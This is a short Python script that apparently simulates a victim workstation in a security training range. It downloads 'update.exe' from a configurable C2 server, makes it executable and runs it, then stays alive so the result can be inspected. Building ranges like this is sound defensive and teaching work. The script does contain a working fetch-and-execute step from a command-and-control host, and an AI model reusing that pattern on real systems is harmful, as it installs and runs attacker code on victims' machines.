import requests
import time
import os
import subprocess
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - USER_SIM - %(message)s')
logger = logging.getLogger()

C2_HOST = os.environ.get('C2_HOST', 'c2-server')
C2_PORT = os.environ.get('C2_PORT', '80')
DOWNLOAD_URL = f"http://{C2_HOST}:{C2_PORT}/download/update.exe"
TARGET_PATH = "/home/employee/Downloads/update.exe"

def simulate_activity():
    logger.info("Employee workstation started. Working...")
    time.sleep(5) # Simulate work time
    
    logger.info("User browsing the web... spotted an update.")
    try:
        response = requests.get(DOWNLOAD_URL)
        if response.status_code == 200:
            with open(TARGET_PATH, 'wb') as f:
                f.write(response.content)
            logger.info(f"Downloaded 'update.exe' to {TARGET_PATH}")
            
            # Simulate user executing it
            logger.info("User executing the update...")
            subprocess.run(["chmod", "+x", TARGET_PATH])
            # We execute it. The malware script needs a shebang or we run with python
            # Since it's a simulation, we assume the downloaded file is a python script packed as exe or just a script
            # For this range, we will treat it as a python script.
            subprocess.Popen(["python", TARGET_PATH])
            
        else:
            logger.error(f"Failed to download update. Status: {response.status_code}")
    except Exception as e:
        logger.error(f"Connection failed: {e}")

if __name__ == "__main__":
    # Wait for C2 to be up
    time.sleep(5) 
    simulate_activity()
    
    # Keep container alive to allow inspection
    while True:
        time.sleep(60)
